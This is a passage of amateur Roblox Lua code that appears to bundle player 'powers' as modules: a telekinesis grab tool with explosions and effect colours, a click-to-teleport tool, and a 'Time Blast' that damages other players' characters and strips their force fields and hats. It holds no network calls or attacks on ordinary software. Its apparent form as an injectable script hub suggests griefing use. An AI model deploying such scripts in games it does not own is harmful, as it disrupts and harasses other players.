	bp.maxForce = Vector3.new(math.huge,math.huge,math.huge) 
	
	bp.Parent = bawl
	
	bp.Name="lolx"
	
	bawl.Parent = workspace
	
	if mouse ~= nil then
	
		if mouse.Target ~= nil then
	
			w.Part0 = mouse.Target 
			
			w.Part1 = bawl 
			
			dwn = true
	
			if mouse.Target.Parent:FindFirstChild("Humanoid") then
				
				mouse.Target.Parent:FindFirstChild("Humanoid").PlatformStand=true
				
			else
				
				print('no humanoid')
				
			end
	
		end
	
	end
	
	spawn(function()
		
		while dwn == true do 
			
			ypcall(function()		
			
				bp.Parent = bawl 
				
				bp.position = Player.Character.Torso.Position + (mouse.Hit.lookVector*dist)
				
				wait()
			
			end)
			
	    end
	
	end)
	
end

function onButton1Up(mouse)
		
	dwn=false

	if bawl ~= nil then
			
		bawl.Parent=game.Lighting 
			
	else 
			
		print('not found') 
			
	end
	
end 
	
function onKeyDown(key, mouse) 
		
	key:lower() 
		
	if key == "r" then 
			
		if bawl ~= nil then
				
			--bawl.Parent=nil
				
		end
			
	elseif key == "e" then 
			
		local p = Instance.new("Part", workspace)
			
		p.Size = Vector3.new(3,3,3)
			
		p.Material = "Neon"
			
		p.Position = mouse.Hit.p + Vector3.new(0,2,0) 
			
		p.BrickColor = bawl.BrickColor
			
		p.Shape = "Ball"
			
		p.BottomSurface = "Smooth"
			
		p.TopSurface = "Smooth"
			
	elseif key == "h" then
			
		if bawl ~= nil then
				
			if bawl:FindFirstChild("Weld") ~= nil then
				
				if bawl:FindFirstChild("Weld").Part0 ~= nil then
				
					bawl:FindFirstChild("Weld").Part0.Anchored=false
				
				end
				
			end
				
		end
			
	elseif key == "g" then
			
		if bawl ~= nil then

			local x = Instance.new("Explosion",workspace)

			x.Position=bawl.Position
				
		else
				
			print('some sort of error')
				
		end
			
	elseif key == "x" then 
			
		dist=dist - 5
			
	elseif key == "c" then 
			
		dist=15
			
	elseif key == "v" then 
			
		dist=100
			
	elseif key == "z" then 
			
		dist=dist + 5
			
	end  
		
end

FireX = 0

FireY = 0

FireZ = 0

SPX = 0

SPY = 0

SPZ = 0

BoxColor = "White"

FireFalse.MouseButton1Down:connect(function ()
	
	local Fire = Instance.new("Fire", bawl)
    Fire.Color = Color3.new(FireX,FireY,FireZ)

    Player.PlayerGui.ScreenGui.FireFalse.Visible = false

    Player.PlayerGui.ScreenGui.FireTrue.Visible = true

    Fire.Color = Color3.new(FireX,FireY,FireZ)
	
end)

FireTrue.MouseButton1Down:connect(function ()
	
	bawl.Fire:remove()

    Player.PlayerGui.ScreenGui.FireFalse.Visible = true

    Player.PlayerGui.ScreenGui.FireTrue.Visible = false
	
end)

SparklesFalse.MouseButton1Down:connect(function ()
	
	local SP = Instance.new("Sparkles", bawl)
    SP.Color = Color3.new(SPX,SPY,SPZ)

    Player.PlayerGui.ScreenGui.SparklesFalse.Visible = false

    Player.PlayerGui.ScreenGui.SparklesTrue.Visible = true
	
end)

SparklesTrue.MouseButton1Down:connect(function ()
	
	bawl.Sparkles:remove()

    Player.PlayerGui.ScreenGui.SparklesFalse.Visible = true

    Player.PlayerGui.ScreenGui.SparklesTrue.Visible = false
	
end)

BoxFalse.MouseButton1Down:connect(function ()
	
	local Box = Instance.new("SelectionBox", bawl)
    Box.Color = BrickColor.new(BoxColor)
    Box.Adornee = Box.Parent

    Player.PlayerGui.ScreenGui.BoxFalse.Visible = false

    Player.PlayerGui.ScreenGui.BoxTrue.Visible = true
	
end)

BoxTrue.MouseButton1Down:connect(function ()
	
	bawl.SelectionBox:remove()

    Player.PlayerGui.ScreenGui.BoxFalse.Visible = true

    Player.PlayerGui.ScreenGui.BoxTrue.Visible = false
	
end)
	
Blue.MouseButton1Down:connect(function ()

	if bawl ~= nil then
		
		bawl.BrickColor = BrickColor.new("Bright blue")
		
		FireX = 0
		FireY = 0
		FireZ = 255
		
		SPX = 0
		SPY = 0
		SPZ = 255
		
		BoxColor = "Bright blue"
		
		game.Lighting.TelekinesisGrab.Fire.Color = Color3.new(0,0,255)
		
		game.Lighting.TelekinesisGrab.Sparkles.Color = Color3.new(0,0,255)
		
		game.Lighting.TelekinesisGrab.SelectionBox.Color = BrickColor.new("Bright blue")

	end

end)
	
Red.MouseButton1Down:connect(function ()
		
	if bawl ~= nil then
			
		bawl.BrickColor = BrickColor.new("Bright red")
		
		FireX = 255
		FireY = 0
		FireZ = 0
		
		SPX = 255
		SPY = 0
		SPZ = 0
		
		BoxColor = "Bright red"
		
		game.Lighting.TelekinesisGrab.Fire.Color = Color3.new(255,0,0)
		
		game.Lighting.TelekinesisGrab.Sparkles.Color = Color3.new(255,0,0)
		
		game.Lighting.TelekinesisGrab.SelectionBox.Color = BrickColor.new("Bright red")

	end
		
end)
	
Green.MouseButton1Down:connect(function ()

	if bawl ~= nil then

		bawl.BrickColor = BrickColor.new("Bright green")
		
		FireX = 0
		FireY = 255
		FireZ = 0
		
		SPX = 0
		SPY = 255
		SPZ = 0
		
		BoxColor = "Bright green"
		
		game.Lighting.TelekinesisGrab.Fire.Color = Color3.new(0,255,0)
		
		game.Lighting.TelekinesisGrab.Sparkles.Color = Color3.new(0,255,0)
		
		game.Lighting.TelekinesisGrab.SelectionBox.Color = BrickColor.new("Bright green")
		
	end
	
end)
	
Yellow.MouseButton1Down:connect(function ()
		
	if bawl ~= nil then
			
		bawl.BrickColor = BrickColor.new("New Yeller")
		
		FireX = 255
		FireY = 255
		FireZ = 0
		
		SPX = 255
		SPY = 255
		SPZ = 0
		
		BoxColor = "New Yeller"
		
		game.Lighting.TelekinesisGrab.Fire.Color = Color3.new(255,255,0)
		
		game.Lighting.TelekinesisGrab.Sparkles.Color = Color3.new(255,255,0)
		
		game.Lighting.TelekinesisGrab.SelectionBox.Color = BrickColor.new("New Yeller")
			
	end
		
end)
	
Pink.MouseButton1Down:connect(function ()
		
	if bawl ~= nil then
			
		bawl.BrickColor = BrickColor.new("Hot pink")
		
		FireX = 255
		FireY = 0
		FireZ = 255
		
		SPX = 255
		SPY = 0
		SPZ = 255
		
		BoxColor = "Hot pink"
		
		game.Lighting.TelekinesisGrab.Fire.Color = Color3.new(255,0,255)
		
		game.Lighting.TelekinesisGrab.Sparkles.Color = Color3.new(255,0,255)
		
		game.Lighting.TelekinesisGrab.SelectionBox.Color = BrickColor.new("Hot pink")
		
	end
		
end)
	
LightBlue.MouseButton1Down:connect(function ()
		
	if bawl ~= nil then
			
		bawl.BrickColor = BrickColor.new("Cyan")
		
		FireX = 0
		FireY = 255
		FireZ = 255
		
		SPX = 0
		SPY = 255
		SPZ = 255
		
		BoxColor = "Cyan"
		
		game.Lighting.TelekinesisGrab.Fire.Color = Color3.new(0,255,255)
		
		game.Lighting.TelekinesisGrab.Sparkles.Color = Color3.new(0,255,255)
		
		game.Lighting.TelekinesisGrab.SelectionBox.Color = BrickColor.new("Cyan")
			
	end
		
end)
    
	
White.MouseButton1Down:connect(function ()

	if bawl ~= nil then
			
		bawl.BrickColor = BrickColor.new("White")
		
		FireX = 255
		FireY = 255
		FireZ = 255
		
		SPX = 255
		SPY = 255
		SPZ = 255
		
		BoxColor = "White"
		
		game.Lighting.TelekinesisGrab.Fire.Color = Color3.new(255,255,255)
		
		game.Lighting.TelekinesisGrab.Sparkles.Color = Color3.new(255,255,255)
		
		game.Lighting.TelekinesisGrab.SelectionBox.Color = BrickColor.new("White")
			
	end
	
end)

Bin.Selected:connect(function ()
	
	Fire = false
	
	Player.PlayerGui.ScreenGui.Blue.Visible = true
	
	Player.PlayerGui.ScreenGui.Red.Visible = true
	
	Player.PlayerGui.ScreenGui.Green.Visible = true
	
	Player.PlayerGui.ScreenGui.Yellow.Visible = true
	
	Player.PlayerGui.ScreenGui.Pink.Visible = true
	
	Player.PlayerGui.ScreenGui.LightBlue.Visible = true
	
	Player.PlayerGui.ScreenGui.White.Visible = true
	
	Player.PlayerGui.ScreenGui.FireFalse.Visible = true
	
	Player.PlayerGui.ScreenGui.FireTrue.Visible = false
	
	Player.PlayerGui.ScreenGui.SparklesFalse.Visible = true
	
	Player.PlayerGui.ScreenGui.SparklesTrue.Visible = false
	
	Player.PlayerGui.ScreenGui.BoxFalse.Visible = true
	
	Player.PlayerGui.ScreenGui.BoxTrue.Visible = false
	
end)

Bin.Deselected:connect(function ()
	
	Fire = false
	
	Player.PlayerGui.ScreenGui.Blue.Visible = false
	
	Player.PlayerGui.ScreenGui.Red.Visible = false
	
	Player.PlayerGui.ScreenGui.Green.Visible = false
	
	Player.PlayerGui.ScreenGui.Yellow.Visible = false
	
	Player.PlayerGui.ScreenGui.Pink.Visible = false
	
	Player.PlayerGui.ScreenGui.LightBlue.Visible = false
	
	Player.PlayerGui.ScreenGui.White.Visible = false
	
	Player.PlayerGui.ScreenGui.FireFalse.Visible = false
	
	Player.PlayerGui.ScreenGui.FireTrue.Visible = false
	
	Player.PlayerGui.ScreenGui.SparklesFalse.Visible = false
	
	Player.PlayerGui.ScreenGui.SparklesTrue.Visible = false
	
	Player.PlayerGui.ScreenGui.BoxFalse.Visible = false
	
	Player.PlayerGui.ScreenGui.BoxTrue.Visible = false
	
end)
	
Bin.Selected:connect(function(mouse)
	
	mouse.Button1Down:connect(function() onButton1Down(mouse) end)
	
	mouse.Button1Up:connect(function() onButton1Up(mouse) end)
	
	mouse.KeyDown:connect(function(key) onKeyDown(key, mouse) end)
	
end)
end}
module[4] = {"Teleport Tool",function()

bin=Instance.new("HopperBin",game.Players.LocalPlayer.Backpack)
bin.Name = "Teleport"

function teleportPlayer(pos)

	local player = game.Players.LocalPlayer
	if player == nil or player.Character == nil then return end

	local char = player.Character

	char:MoveTo(pos)

end


enabled = true
function onButton1Down(mouse)
	if not enabled then
		return
	end

	local player = game.Players.LocalPlayer
	if player == nil then return end
	local cf = mouse.Hit
	teleportPlayer(cf.p)

end

function onSelected(mouse)
	mouse.Icon = "rbxasset://textures\\ArrowCursor.png"
	mouse.Button1Down:connect(function() onButton1Down(mouse) end)
end

bin.Selected:connect(onSelected)

end}
module[5] = {"Time Blast",function()
math.randomseed(tick())
local pwn = game:service('Players').LocalPlayer
local char = pwn.Character
local pk = pwn.Backpack
local Human = char.Humanoid
local Torso = char.Torso
local Head = char.Head
local LeftArm = char["Left Arm"]
local RightArm = char["Right Arm"]
local LeftLeg = char["Left Leg"]
local RightLeg = char["Right Leg"]
local Neck = char.Torso["Neck"]
local RightShoulder = char.Torso["Right Shoulder"]
local LeftShoulder = char.Torso["Left Shoulder"]
local RightHip = char.Torso["Right Hip"]
local LeftHip = char.Torso["Left Hip"]
local NeckC0 = CFrame.new(0, 1, 0, -1, 0, 0, 0, 0, 1, 0, 1, 0)
local NeckC1 = CFrame.new(0, -0.5, 0, -1, 0, 0, 0, 0, 1, 0, 1, 0)
local LeftShoulderC0 = CFrame.new(-1, 0.5, 0, 0, 0, -1, 0, 1, 0, 1, 0, 0)
local LeftShoulderC1 = CFrame.new(0.5, 0.5, 0, 0, 0, -1, 0, 1, 0, 1, 0, 0)
local RightShoulderC0 = CFrame.new(1, 0.5, 0, 0, 0, 1, 0, 1, 0, -1, 0, 0)
local RightShoulderC1 = CFrame.new(-0.5, 0.5, 0, 0, 0, 1, 0, 1, 0, -1, 0, 0)
local LeftHipC0 = CFrame.new(-1, -1, 0, 0, 0, -1,0,1, 0, 1, 0, 0)
local LeftHipC1 = CFrame.new(-0.5,1,0,0,0,-1,0,1,0,1, 0, 0)
local RightHipC0 = CFrame.new(1,-1,0,0,0,1,0,1,0,-1,0,0)
local RightHipC1 = CFrame.new(0.5,1,0,0,0,1,0,1,0,-1,0,0)
local Tewl = Instance.new("HopperBin",pk)
local Nim = "Time Blast"
local disabled = false
function ChargeWelds()
if Torso.Anchored then
Torso.CFrame = Torso.CFrame * CFrame.new(0,5,0)
else
Torso.Anchored = true
Torso.CFrame = Torso.CFrame * CFrame.new(0,5,0)
end
coroutine.resume(meshInsertion)
TiltX = 2
TiltY = 0
TiltZ = 2
RightShoulder.C0 = RightShoulderC0 * CFrame.Angles(TiltX, TiltY, TiltZ)
LeftShoulder.C0 = LeftShoulderC0 * CFrame.Angles(TiltX, TiltY, TiltZ)
TiltX = 2
TiltY = 0
TiltZ = 2
MoveX = 0
MoveY = 0
MoveZ = 0
RightShoulder.C0 = RightShoulder.C0 * CFrame.Angles(TiltX, TiltY, TiltZ) * CFrame.new(MoveX, MoveY, MoveZ)
LeftShoulder.C0 = LeftShoulder.C0 * CFrame.Angles(TiltX, TiltY, TiltZ) * CFrame.new(MoveX,MoveY,MoveZ)
TiltX = 0.3
TiltY = 0
TiltZ = 0.3
MoveX = 0
MoveY = 0
MoveZ = 0
RightHip.C0 = RightHipC0 * CFrame.Angles(TiltX, TiltY, TiltZ) * CFrame.new(MoveX, MoveY, MoveZ)
LeftHip.C0 = LeftHipC0 * CFrame.Angles(TiltX, TiltY, TiltZ) * CFrame.new(MoveX, MoveY, MoveZ)
end
function RefreshWelds()
Neck.C0 = NeckC0
Neck.C1 = NeckC1
RightShoulder.C0 = RightShoulderC0
RightShoulder.C1 = RightShoulderC1
LeftShoulder.C0 = LeftShoulderC0
LeftShoulder.C1 = LeftShoulderC1
RightHip.C0 = RightHipC0
RightHip.C1 = RightHipC1
LeftHip.C0 = LeftHipC0
LeftHip.C1 = LeftHipC1
end
function Welds1()
TiltX = 0
TiltY = 0
TiltZ = 1.57
RightShoulder.C0 = RightShoulderC0 * CFrame.Angles(TiltX, TiltY, TiltZ)
LeftShoulder.C0 = LeftShoulderC0 * CFrame.Angles(TiltX, TiltY, -TiltZ)
TiltX = 0.6
TiltY = 0
TiltZ = 0
MoveX = 0
MoveY = 0
MoveZ = -0.3
RightShoulder.C0 = RightShoulder.C0 * CFrame.Angles(TiltX, TiltY, TiltZ) * CFrame.new(MoveX, MoveY, MoveZ)
LeftShoulder.C0 = LeftShoulder.C0 * CFrame.Angles(TiltX, TiltY, TiltZ) * CFrame.new(MoveX, MoveY, MoveZ)
TiltX = -0.05
TiltY = 0
TiltZ = 0
MoveX = 0
MoveY = 0.1
MoveZ = 0
RightHip.C0 = RightHipC0 * CFrame.Angles(TiltX, TiltY, TiltZ) * CFrame.new(MoveX, MoveY, MoveZ)
LeftHip.C0 = LeftHipC0 * CFrame.Angles(TiltX, TiltY, TiltZ) * CFrame.new(MoveX, MoveY, MoveZ)
end
function Welds2()
TiltX = 100
TiltY = 20
TiltZ = -20
RightShoulder.C0 = RightShoulderC0 * CFrame.Angles(TiltX, TiltY, TiltZ)
LeftShoulder.C0 = LeftShoulderC0 * CFrame.Angles(TiltX, TiltY, TiltZ)
TiltX = 0.6
TiltY = 0
TiltZ = 0
MoveX = 0
MoveY = 0
MoveZ = -0.3
RightShoulder.C0 = RightShoulder.C0 * CFrame.Angles(TiltX, TiltY, TiltZ) * CFrame.new(MoveX, MoveY, MoveZ)
LeftShoulder.C0 = LeftShoulder.C0 * CFrame.Angles(TiltX, TiltY, TiltZ) * CFrame.new(MoveX, MoveY, MoveZ)
TiltX = 0
TiltY = 0
TiltZ = 0
MoveX = 0
MoveY = 0
MoveZ = 0
RightHip.C0 = RightHipC0 * CFrame.Angles(TiltX, TiltY, TiltZ) * CFrame.new(MoveX, MoveY, MoveZ)
LeftHip.C0 = LeftHipC0 * CFrame.Angles(TiltX, TiltY, TiltZ) * CFrame.new(MoveX, MoveY, MoveZ)
end
function onButton1Down(mouse)
if disabled == true then
return
end
Torso.Anchored = true
Human.PlatformStand = true
Human.WalkSpeed = 0
disabled = true
narb = Instance.new("ForceField",char)
noob = narb:clone()
noobz = narb:clone()
nubz = narb:clone()
coroutine.resume(coroutine.create(function()
for x = 1,150 do
Torso.CFrame = Torso.CFrame * CFrame.fromEulerAnglesXYZ(0,math.random(-100,100),0)
wait()
end
end))
chargeup()
local wow = Instance.new("Part",workspace)
wow.Anchored = true
wow.CanCollide = false
wow.Reflectance = 0.32
wow.formFactor = "Custom"
wow.Size = Vector3.new(0.2,0.2,0.2)
wow.TopSurface = "Smooth"
wow.Transparency = 0
wow.BottomSurface = "Smooth"
wow.CFrame = Torso.CFrame
wow.BrickColor = BrickColor.new("Really black")
local Mesh2 = Instance.new("SpecialMesh",wow)
Mesh2.MeshType = "FileMesh"
Mesh2.Scale = Vector3.new(4.5,0.5,4.5)
Mesh2.MeshId = "http://www.roblox.com/asset/?id=20329976"
Mesh2.TextureId = ""
for i = 1,30 do
wow.CFrame = Torso.CFrame * CFrame.new(0,-7.5,0)
wait()
wow.CFrame = wow.CFrame * CFrame.fromEulerAnglesXYZ(0,-6,0)
wow.Transparency = wow.Transparency + 0.1
end
local p = Instance.new("Part",char)
p.Anchored = true
p.CanCollide = false
p.Transparency = 0
p.Reflectance = 0.3
p.formFactor = "Symmetric"
p.Size = Vector3.new(12, 12, 12)
p.TopSurface = "Smooth"
p.BottomSurface = "Smooth"
p.Name = "Sharingan"
p.Shape = "Ball"
p.CFrame = Torso.CFrame
p.BrickColor = BrickColor.new("Lime green")
local lol = Instance.new("Explosion",workspace) 
lol.Position = Torso.Position
lol.BlastRadius = 450
lol.BlastPressure = 0
for i = 1,10 do
wait()
p.Size = p.Size + Vector3.new(3,3,3)
p.CFrame = Torso.CFrame
p.Transparency = p.Transparency + 0.1
end
game.Lighting.TimeOfDay = 6
p:remove()
wow:remove()
Welds2()
wait(0.5)
Welds1()
wait(0.5)
RightShoulder.C0 = RightShoulderC0 * CFrame.Angles(0.1, 0, 2)
LeftShoulder.C0 = LeftShoulderC0 * CFrame.Angles(0.1, 0, -2)
wait(1)
for i = 1,20 do
game.Lighting.Ambient = Color3.new(math.random(),math.random(),math.random())
wait()
end
game.Lighting.Ambient = Color3.new(1,1,1)
local model = Instance.new("Model",char)
local fer = Instance.new("Fire",Torso)
fer.Size = 30
fer.Heat = 18
fer.Color = BrickColor.new("Really red").Color
fer.SecondaryColor = BrickColor.new("Really black").Color
local smk = Instance.new("Smoke",Torso)
smk.Opacity = 1
smk.RiseVelocity = 25
smk.Size = 12
smk.Color = BrickColor.new("Really red").Color
local O = Instance.new("Part",model)
O.Anchored = true
O.CanCollide = false
O.Transparency = 0
O.Reflectance = 0.3
O.formFactor = "Symmetric"
O.Size = Vector3.new(0, 0, 0)
O.TopSurface = "Smooth"
O.BottomSurface = "Smooth"
O.Name = "Sharingan"
O.Shape = "Ball"
O.CFrame = Torso.CFrame*CFrame.fromEulerAnglesXYZ(1.5, 0, 0)
O.BrickColor = BrickColor.new("Really red")
local Mesh = Instance.new("SpecialMesh")
Mesh.Parent = O
Mesh.MeshType = "FileMesh"
Mesh.Scale = Vector3.new(1.3, 1.3, 1.3)
Mesh.MeshId = "http://www.roblox.com/asset/?id=3270017"
Mesh.TextureId = ""
local O2 = Instance.new("Part",model)
O2.Anchored = true
O2.CanCollide = false
O2.Transparency = 0
O2.Reflectance = 0.3
O2.formFactor = "Symmetric"
O2.Size = Vector3.new(0, 0, 0)
O2.TopSurface = "Smooth"
O2.BottomSurface = "Smooth"
O2.Name = "Sharingan"
O2.Shape = "Ball"
O2.CFrame = Torso.CFrame
O2.BrickColor = BrickColor.new("Really red")
local Mesh3 = Instance.new("SpecialMesh")
Mesh3.Parent = O2
Mesh3.MeshType = "FileMesh"
Mesh3.Scale = Vector3.new(1, 1, 1)
Mesh3.MeshId = "http://www.roblox.com/asset/?id=3270017"
Mesh3.TextureId = ""
local O3 = Instance.new("Part",model)
O3.Anchored = true
O3.CanCollide = false
O3.Transparency = 0
O3.Reflectance = 0.3
O3.formFactor = "Symmetric"
O3.Size = Vector3.new(0, 0, 0)
O3.TopSurface = "Smooth"
O3.BottomSurface = "Smooth"
O3.Name = "Sharingan"
O3.Shape = "Ball"
O3.CFrame = Torso.CFrame*CFrame.fromEulerAnglesXYZ(1.5, 0, 0)
O3.BrickColor = BrickColor.new("Really red")
local Mesh4 = Instance.new("SpecialMesh")
Mesh4.Parent = O3
Mesh4.MeshType = "FileMesh"
Mesh4.Scale = Vector3.new(1.3, 1.3, 1.3)
Mesh4.MeshId = "http://www.roblox.com/asset/?id=3270017"
Mesh4.TextureId = ""
local O4 = Instance.new("Part",model)
O4.Anchored = true
O4.CanCollide = false
O4.Transparency = 0
O4.Reflectance = 0.3
O4.formFactor = "Symmetric"
O4.Size = Vector3.new(0, 0, 0)
O4.TopSurface = "Smooth"
O4.BottomSurface = "Smooth"
O4.Name = "Sharingan"
O4.Shape = "Ball"
O4.CFrame = Torso.CFrame
O4.BrickColor = BrickColor.new("Really red")
local Mesh5 = Instance.new("SpecialMesh")
Mesh5.Parent = O4
Mesh5.MeshType = "FileMesh"
Mesh5.Scale = Vector3.new(1, 1, 1)
Mesh5.MeshId = "http://www.roblox.com/asset/?id=3270017"
Mesh5.TextureId = ""
local pro = Instance.new("Part",char)
pro.Anchored = true
pro.CanCollide = true
pro.Transparency = 0.2
pro.Reflectance = 0.3
pro.formFactor = "Symmetric"
pro.Size = Vector3.new(1, 1, 1)
pro.TopSurface = "Smooth"
pro.BottomSurface = "Smooth"
pro.Name = "Sharingan"
pro.Shape = "Ball"
pro.BrickColor = BrickColor.new("White")
pro.CFrame = Torso.CFrame
pro.Touched:connect(onTouched)
local lol = Instance.new("Explosion",workspace) 
lol.Position = Torso.Position
lol.BlastRadius = 65
lol.BlastPressure = 900000
lol.Hit:connect(explhit)
local Effect = Instance.new("Part",pro) 
Effect.Anchored = true 
Effect.CanCollide = false 
Effect.Size = Vector3.new(1, 1, 1)
Effect.formFactor = "Symmetric" 
Effect.Transparency = 0.6
Effect.BrickColor = BrickColor.new("Toothpaste")
Effect.CFrame = Torso.CFrame
Effect.Reflectance = 0.6
Effect.TopSurface = "Smooth" 
Effect.BottomSurface = "Smooth" 
local EffectMesh = Instance.new("CylinderMesh",Effect) 
EffectMesh.Scale = Vector3.new(3, 90000, 3)
local effect = Effect:Clone()
local effectmesh = EffectMesh:Clone()
effect.Parent = pro
effectmesh.Parent = effect
for i = 1,75 do
effect.Reflectance = math.random()
Effect.Reflectance = math.random()
effectmesh.Scale = effectmesh.Scale + Vector3.new(1,0,1)
EffectMesh.Scale = EffectMesh.Scale + Vector3.new(2,0,2)
Mesh.Scale = Mesh.Scale + Vector3.new(3, 3, 3)
Mesh3.Scale = Mesh.Scale
Mesh4.Scale = Mesh.Scale
Mesh5.Scale = Mesh.Scale
O.CFrame = O.CFrame * CFrame.fromEulerAnglesXYZ(6,0,0)
O2.CFrame = O2.CFrame * CFrame.fromEulerAnglesXYZ(0,6,0)
O3.CFrame = O3.CFrame * CFrame.fromEulerAnglesXYZ(0,6,6)
O4.CFrame = O4.CFrame * CFrame.fromEulerAnglesXYZ(6,0,6)
pro.Size = pro.Size + Vector3.new(3,3,3)
pro.CFrame = Torso.CFrame
O.BrickColor = BrickColor.new("Lime green")
O2.BrickColor = BrickColor.new("Lime green")
O3.BrickColor = BrickColor.new("Lime green")
O4.BrickColor = BrickColor.new("Lime green")
pro.BrickColor = BrickColor.new("Really black")
wait()
end
coroutine.resume(core)
for i = 1,10 do
Effect.Reflectance = 0 + 0.1
effect.Reflectance = 0 + 0.1
EffectMesh.Scale = EffectMesh.Scale - Vector3.new(12,30,12)
effectmesh.Scale = effectmesh.Scale - Vector3.new(11,29,11)
O.Transparency = O.Transparency + 0.1
O2.Transparency = O2.Transparency + 0.1
O3.Transparency = O3.Transparency + 0.1
O4.Transparency = O4.Transparency + 0.1
pro.Transparency = p.Transparency + 0.01
wait()
end
Effect:remove()	
pro:remove()
fer:remove()
smk:remove()
noob:remove()
noobz:remove()
nubz:remove()
narb:remove()
RefreshWelds()
game.Lighting.TimeOfDay = 14
game.Lighting.Brightness = 0
model:remove()
Human.PlatformStand = false
Torso.Anchored = false
Human.WalkSpeed = 16
wait(10)
disabled = false
end
function lul(mouse)
mouse.Icon = "http://www.roblox.com/asset/?id=41672909"
mouse.Button1Down:connect(onButton1Down)
end
function explhit(drumstep)
for d,s in pairs (drumstep:children()) do
if s.className == "Humanoid" then
s:takeDamage(80)
end
end
end
function chargeup()
Welds1()
wait(0.4)
ChargeWelds()
wait(0.3)
StartCharge()
wait()
MidCharge()
wait(0.5)
EndCharge()
wait(0.4)
end
function EndCharge()
local p = Instance.new("Part",char)
p.Anchored = true
p.CanCollide = false
p.Transparency = 0
p.Reflectance = 0.3
p.formFactor = "Symmetric"
p.Size = Vector3.new(12, 12, 12)
p.TopSurface = "Smooth"
p.BottomSurface = "Smooth"
p.Name = "Sharingan"
p.Shape = "Ball"
p.CFrame = Torso.CFrame
p.BrickColor = BrickColor.new("Really black")
for i = 1,10 do
p.Size = p.Size - Vector3.new(3,3,3)
p.CFrame = Torso.CFrame
wait()
end
p:remove()
end
function MidCharge()
local wow = Instance.new("Part",workspace)
wow.Anchored = true
wow.CanCollide = false
wow.Reflectance = 0.32
wow.formFactor = "Custom"
wow.Size = Vector3.new(12,12,12)
wow.TopSurface = "Smooth"
wow.Transparency = 0.5
wow.BottomSurface = "Smooth"
wow.CFrame = Torso.CFrame * CFrame.new(0,0,0)
wow.BrickColor = BrickColor.new("Really black")
local wow2 = Instance.new("Part",workspace)
wow2.Anchored = true
wow2.CanCollide = false
wow2.Reflectance = 0.32
wow2.formFactor = "Custom"
wow2.Size = Vector3.new(12,12,12)
wow2.TopSurface = "Smooth"
wow2.Transparency = 0.5
wow2.BottomSurface = "Smooth"
wow2.CFrame = Torso.CFrame * CFrame.new(0,0,0)
wow2.BrickColor = BrickColor.new("Lime green")
local wow11 = Instance.new("Part",workspace)
wow11.Anchored = true
wow11.CanCollide = false
wow11.Reflectance = 0.32
wow11.formFactor = "Custom"
wow11.Size = Vector3.new(12,12,12)
wow11.TopSurface = "Smooth"
wow11.Transparency = 0.5
wow11.BottomSurface = "Smooth"
wow11.CFrame = Torso.CFrame * CFrame.new(0,0,0)
wow11.BrickColor = BrickColor.new("Lavender")
local wow4 = Instance.new("Part",workspace)
wow4.Anchored = true
wow4.CanCollide = false
wow4.Reflectance = 0.32
wow4.formFactor = "Custom"
wow4.Size = Vector3.new(12,12,12)
wow4.TopSurface = "Smooth"
wow4.Transparency = 0.5
wow4.BottomSurface = "Smooth"
wow4.CFrame = Torso.CFrame * CFrame.new(0,0,0)
wow4.BrickColor = BrickColor.new("Toothpaste")
local Taco = Instance.new("SelectionBox",wow)
Taco.Visible = true
Taco.Color = BrickColor.new("Lime green")
Taco.Adornee = Taco.Parent
local Tacoz = Taco:clone()
Tacoz.Parent = wow2
Tacoz.Color = BrickColor.new("Really black")
Tacoz.Adornee = Tacoz.Parent
local Taco5 = Tacoz:clone()
Taco5.Parent = wow4
Taco5.Adornee = Taco5.Parent
Taco5.Color = BrickColor.new("Lavender")
local Tacosh = Tacoz:clone()
Tacosh.Parent = wow11
Tacosh.Adornee = Tacosh.Parent
Tacosh.Color = BrickColor.new("Toothpaste")
for i = 1,20 do
wait()
wow11.CFrame = wow11.CFrame * CFrame.fromEulerAnglesXYZ(6,6,6)
wow4.CFrame = wow4.CFrame * CFrame.fromEulerAnglesXYZ(-6,-6,-6)
wow2.CFrame = wow2.CFrame * CFrame.fromEulerAnglesXYZ(-3,2,6)
wow.CFrame = wow.CFrame * CFrame.fromEulerAnglesXYZ(5,1,-6)
end
wow:remove()
wow2:remove()
wow4:remove()
wow11:remove()
end
function StartCharge()
local p = Instance.new("Part",char)
p.Anchored = true
p.CanCollide = false
p.Transparency = 0.6
p.Reflectance = 0.3
p.formFactor = "Symmetric"
p.Size = Vector3.new(3,3,3)
p.TopSurface = "Smooth"
p.BottomSurface = "Smooth"
p.Name = "Sharingan"
p.Shape = "Ball"
p.CFrame = Torso.CFrame
p.BrickColor = BrickColor.new("Really black")
local O = Instance.new("Part",model)
O.Anchored = true
O.CanCollide = false
O.Transparency = 0
O.Reflectance = 0.3
O.formFactor = "Symmetric"
O.Size = Vector3.new(0, 0, 0)
O.TopSurface = "Smooth"
O.BottomSurface = "Smooth"
O.Name = "Sharingan"
O.Shape = "Ball"
O.CFrame = Torso.CFrame
O.BrickColor = BrickColor.new("Lime green")
local Mesh = Instance.new("SpecialMesh")
Mesh.Parent = O
Mesh.MeshType = "FileMesh"
Mesh.Scale = Vector3.new(1.3, 1.3, 1.3)
Mesh.MeshId = "http://www.roblox.com/asset/?id=3270017"
Mesh.TextureId = ""
for i = 1,10 do
p.Size = p.Size + Vector3.new(3,3,3)
p.CFrame = Torso.CFrame
p.Transparency = p.Transparency + 0.1
O.Transparency = O.Transparency + 0.1
Mesh.Scale = Mesh.Scale + Vector3.new(4, 4, 4)
wait()
end
p:remove()
O:remove()
end
function onTouched(Taco)
if Taco.Parent.Name ~= pwn.Name and Taco.Parent.Parent.Name ~= pwn.Name then
if Taco.Parent.className == "Model" or Taco.Parent.Parent.className == "Model" then
for k,f in pairs(Taco.Parent:children()) do
if f.className == "Part" then
f.Anchored = false
coroutine.resume(coroutine.create(function()
f.Velocity = (Head.Position - f.Position).unit * -150
wait(0.4)
f.Veclovity = Vector3.new(0,0,0)
end))
elseif f.className == "ForceField" then
f:remove()
elseif f.className == "Hat" then
f:remove()
end
end
end
end
end
function shock()
local wowz = Instance.new("Part",workspace)
wowz.Anchored = true
wowz.CanCollide = false
wowz.Reflectance = 0.32
wowz.formFactor = "Custom"
wowz.Size = Vector3.new(0.2,0.2,0.2)
wowz.TopSurface = "Smooth"
wowz.Transparency = 0
wowz.BottomSurface = "Smooth"
wowz.CFrame = Torso.CFrame * CFrame.new(0,0,0)
wowz.BrickColor = BrickColor.new("Really black")
local Mesh2 = Instance.new("SpecialMesh",wow)
Mesh2.MeshType = "FileMesh"
Mesh2.Scale = Vector3.new(6,0.5,6)
Mesh2.MeshId = "http://www.roblox.com/asset/?id=20329976"
Mesh2.TextureId = ""
for i = 1,30 do
